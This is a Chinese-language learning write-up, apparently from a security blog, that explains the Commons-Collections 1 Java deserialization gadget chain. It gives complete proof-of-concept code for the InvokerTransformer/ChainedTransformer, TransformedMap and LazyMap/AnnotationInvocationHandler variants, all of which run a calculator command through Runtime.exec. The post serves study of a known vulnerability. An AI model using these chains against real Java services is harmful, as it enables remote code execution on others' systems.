---
title: Commons-Collections-1
date: 2021-12-15 13:36:06
categories: Java安全
tags:
- 反序列化
---



> 醉后不知天在水，满船清梦压星河。

Commons Collections 1反序列化链学习

<!-- more -->



## 1. 简介

在jdk1.2中的更新，主要就是java Collections框架，自从变成java处理collection的标准之后，它强大的数据结构大大提高了开发应用的效率。



Commons-Collections对原有的 java Collections进行了扩展增加，有许多新的特性，包括：

- Bag 接口，为有多个副本的集合对象提供接口

- BidiMap接口，为maps提供值到键，键到值的查询接口

- MapIterator，为maps的迭代器提供简单快速的接口

- **每个对象在添加到集合中时，提供改变每个对象的装饰器**

- 使多个集合看起来像复合集合

  。。。。。。



**Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。**

```
https://commons.apache.org/proper/commons-collections/index.html
http://archive.apache.org/dist/commons/collections/binaries/
```



## 2. POC复现

1. 新建一个maven工程

   ```
           <dependency>
               <groupId>commons-collections</groupId>
               <artifactId>commons-collections</artifactId>
               <version>3.1</version>
           </dependency>
   ```

   

2. 网上流传的poc

   ```java
   package cc1;
   
   import org.apache.commons.collections.Transformer;
   import org.apache.commons.collections.functors.ChainedTransformer;
   import org.apache.commons.collections.functors.ConstantTransformer;
   import org.apache.commons.collections.functors.InvokerTransformer;
   import org.apache.commons.collections.map.TransformedMap;
   
   import java.util.HashMap;
   import java.util.Map;
   
   
   public class cc01 {
       public static void main(String[] args) {
           //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
           Transformer[] transformers = new Transformer[] {
                   new ConstantTransformer(Runtime.class),
                   new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                   new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                   new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"open -a calculator"})
           };
   
           //将transformers数组存入ChaniedTransformer这个继承类
           Transformer transformerChain = new ChainedTransformer(transformers);
   
           //创建Map并绑定transformerChina
           Map innerMap = new HashMap();
           innerMap.put("value", "value");
           //给予map数据转化链
           Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
   
           //触发漏洞
           Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
           //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式
           onlyElement.setValue("foobar");
       }
   
   }
   ```

   





## 3. POC构造

### 3.1 直接调用

看一下InvokerTransformer类的transform函数

```java
    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
```

简化一下

```java
public Object transform(Object input) {
    Class cls = input.getClass();
    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
    return method.invoke(input, this.iArgs);
    }
```

看一下对应的构造函数

```java
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
```



通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行：

```java
Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
this.iMethodName="exec"
this.iParamTypes=String.class
this.iArgs="open -a calculator"
```





通过函数调用POC就为：

```java
package cc1;

import com.sun.tools.internal.xjc.reader.xmlschema.BindPurple;
import org.apache.commons.collections.functors.InvokerTransformer;

/**
 * Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
 * this.iMethodName="exec"
 * this.iParamTypes=String.class
 * this.iArgs="open -a calculator"
 *
 *
 *     public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
 *         this.iMethodName = methodName;
 *         this.iParamTypes = paramTypes;
 *         this.iArgs = args;
 *     }
 */

public class Cc01Demo {
    public static void main(String[] args) throws Exception {
        //通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值
        //
        InvokerTransformer invokertransformer = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new String[]{"open -a calculator"}
        );

        //创建invokertransformer对象后调用transform方法
        //Object inputobj = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
        Runtime runtime = Runtime.getRuntime();
        invokertransformer.transform(runtime);
    }
}

```





### 3.2 同一个函数中进行序列化

使用文件写入，代替网络传输

```java
package cc1;

import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.*;

public class cc01Demo2 {
    public static void main(String[] args) throws Exception {
        //通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值
        //
        InvokerTransformer invokertransformer = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new String[]{"open -a calculator"}
        );

        //将invokertransformer作为文件输入流输出为payload.bin
        FileOutputStream fileOutputStream = new FileOutputStream("payload.bin");
        ObjectOutput objectOutput = new ObjectOutputStream(fileOutputStream);
        objectOutput.writeObject(invokertransformer);

        //从payload.bin读取invokertransformer
        FileInputStream fileInputStream = new FileInputStream("payload.bin");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);


        //创建invokertransformer对象后调用transform方法
        //Object inputobj = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
        Runtime runtime = Runtime.getRuntime();

        InvokerTransformer payloadInput = (InvokerTransformer) objectInputStream.readObject();


        payloadInput.transform(runtime);
    }
}

```





### 3.3 网络传输时

ChainedTransformer类中，

```java
    public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
```

这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果。

首先确定iTransformers可控，**iTransformers数组**是通过**ChainedTransformer**类的**构造函数**赋值的。

```java
public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }
```

我们可以通过创建一个ChainedTransformer对象来控制iTransformers数组

```java
Transformer transformerChain = new ChainedTransformer(transformers);
```



那我们就把payload封装成Transformer[]。然后作为构造函数的参数创建一个ChainedTransformer对象

首先Transformer是一个接口

```java
public interface Transformer {
    Object transform(Object var1);
}
```

那么我们封装payload的时候就要转换成Transformer的实现类。

InvokerTransformer 继承了Transformer 和 Serializable

ConstantTransformer也继承了Transformer

这里用InvokerTransformer来改造poc

```java
package cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class Cc01Demo3 {
    public static void main(String[] args) {
        //客户端poc
        Transformer[] transformers = new Transformer[] {
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        
        //服务端poc
        Runtime runtime = Runtime.getRuntime();
        transformerChain.transform(runtime);
    }
}

```

上述poc有个问题就是服务端需要我们创建一个Runtime对象，我们不可能控制服务端。所以我们需要在数组中进行串行调用。

先获取Runtime对象，再通过Runtime对象执行方法

```java
package cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class Cc01Demo4 {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[]{"open -a calculator"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        transformerChain.transform(null);
    }
}

```

那么如果我们反序列化呢

```java
package cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Cc01Demo5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                //new ConstantTransformer(Runtime.getRuntime()),
                new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[]{"open -a calculator"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(transformerChain);

        //服务端反序列化payload读取
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);

        //服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input
        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();
        transformerChain_now.transform(null);


    }
}

```

是会失败的，因为Runtime类没有继承Serializable，无法在服务端反序列化成功。



既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例

```java
package cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class Cc01Demo06 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.getRuntime()),//得到Runtime class
                new InvokerTransformer("getRuntime",new Class[]{},new Object[]{}),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"open -a calculator"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        transformerChain.transform(null);
    }
}

```



最终的poc

```java
package cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class POC0 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                //1. 获取Runtime Class
                //new ConstantTransformer(Class.forName("java.lang.Runtime"))
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"open -a calculator"})
        };
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(transformerChain);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);

        //服务端反序列化成ChainedTransformer格式，再调用transform函数
        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();
        transformerChain_now.transform(null);
    }
}

```







### 3.4 TransformedMap

由于我们得到的是ChainedTransformer，一个转换链，**TransformedMap**类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。

这样我们就可以把触发条件从显性的调用**转换链的transform函数**延伸到**修改map的值**。很明显后者是一个常规操作，极有可能被触发。



```java
package cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class PocMap {
    public static void main(String[] args) throws Exception {
        //1.客户端构建攻击代码
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"open -a calculator"})
        };
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChina
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(outerMap);

        //2.服务端接受反序列化，出发漏洞
        //读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);

        //服务端反序列化成Map格式，再调用transform函数
        Map outerMap_now =  (Map)fin.readObject();
        //2.1可以直接map添加新值，触发漏洞
        //outerMap_now.put("123", "123");
        //2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞
        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        onlyElement.setValue("foobar");
    }
}

```





## 4. LazyMap版本

jdk 8u72一下

```java
package serialize;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class PoclazyMap {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, IOException {
        Transformer[] transformers_exec = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open -a calculator"})
        };

        Transformer chain = new ChainedTransformer(transformers_exec);

        HashMap innerMap = new HashMap();
        innerMap.put("value","ddddddd");

        Map lazyMap = LazyMap.decorate(innerMap,chain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
        cons.setAccessible(true);

        // 创建LazyMap的handler实例
        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,lazyMap);
        // 创建LazyMap的动态代理实例
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(), handler);

        // 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues
        InvocationHandler handler1 = (InvocationHandler)cons.newInstance(Override.class, mapProxy);

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(handler1);
        oos.flush();
        oos.close();

        // 本地模拟反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object obj = (Object) ois.readObject();
    }
}

```







## 5. 总结

对poc进行了简单分析，分别使用了TransformedMap版和lazyMpa进行了复现





## 6. 参考

-  https://shadowflow123.github.io/2021/12/15/Commons-Collections-1
